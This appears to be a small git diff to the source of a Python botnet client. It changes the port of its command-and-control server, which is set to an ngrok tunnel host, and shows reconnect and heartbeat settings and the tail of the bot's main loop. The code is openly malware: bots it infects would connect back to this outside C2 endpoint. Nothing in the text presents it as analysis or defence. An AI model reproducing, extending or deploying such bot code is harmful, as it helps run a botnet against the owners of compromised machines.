@@ -19,7 +19,7 @@ from urllib.parse import urlparse
 # =========================
 RECONNECT_DELAY = 5          # Reduced for testing
 HEARTBEAT_INTERVAL = 10      # Seconds between heartbeats
-CNC_SERVER_PORT = 11532        # Bot connection port
+CNC_SERVER_PORT = 18353        # Bot connection port
 CNC_SERVER_IP = "0.tcp.ap.ngrok.io"  # Use the actual server IP
 
 # Bot identity
@@ -2826,3 +2826,4 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"[-] Bot error: {e}")
         bot.stop()
+
